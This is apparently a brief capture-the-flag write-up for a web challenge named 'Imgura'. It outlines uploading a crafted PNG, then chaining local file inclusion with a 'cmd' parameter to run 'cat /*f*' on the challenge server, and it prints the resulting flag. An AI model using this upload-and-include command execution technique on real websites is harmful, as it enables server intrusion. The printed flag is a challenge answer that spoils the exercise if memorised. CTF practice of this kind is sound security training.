# Imgura exploit step by step
## 1. Create exploit png file
```
python3 solve.py
```
## 2. Upload  file to Imgura website
Upload `exploit.png.pnp` file generated from the last step to the Imgura website.

Then, remember the uploaded file name listed in the URL.
e.g. `b0a34d73_exploit.png`
## 3. Command Injection using LCI in the website
Enter URL:
`https://imgura.chal.h4ck3r.quest/dev_test_page/?page=images/b0a34d73_exploit.png&cmd=cat /*f*`
to inject command and see the **FLAG** in the last line of the page.

> FLAG{ImgurAAAAAA}